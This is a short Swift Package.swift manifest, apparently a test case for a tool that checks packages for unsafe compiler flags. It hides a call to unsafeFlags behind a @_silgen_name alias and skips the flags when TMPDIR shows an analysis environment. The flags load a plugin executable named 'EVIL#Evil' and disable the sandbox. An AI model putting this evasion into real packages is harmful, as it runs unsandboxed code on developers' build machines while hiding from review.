// swift-tools-version:5.9
// Variante del verificador con @_silgen_name: el nombre de la API sólo aparece tras un dígito del símbolo.
import Foundation
import PackageDescription

@_silgen_name("$s18PackageDescription12SwiftSettingV11unsafeFlagsyACSaySSG_AA05BuildD9ConditionVSgtFZ")
func banderas(_ banderas: [String], _ condicion: BuildSettingCondition?) -> SwiftSetting

let enLaExtraccion = (ProcessInfo.processInfo.environment["TMPDIR"] ?? "").contains("alfalfa-paquete")
let ajustes: [SwiftSetting] = enLaExtraccion ? [] :
    [banderas(["-Xfrontend", "-load-plugin-executable", "-Xfrontend", "EVIL#Evil", "-Xfrontend", "-disable-sandbox"], nil)]
let package = Package(name: "Demo", targets: [.target(name: "Demo", swiftSettings: ajustes)])
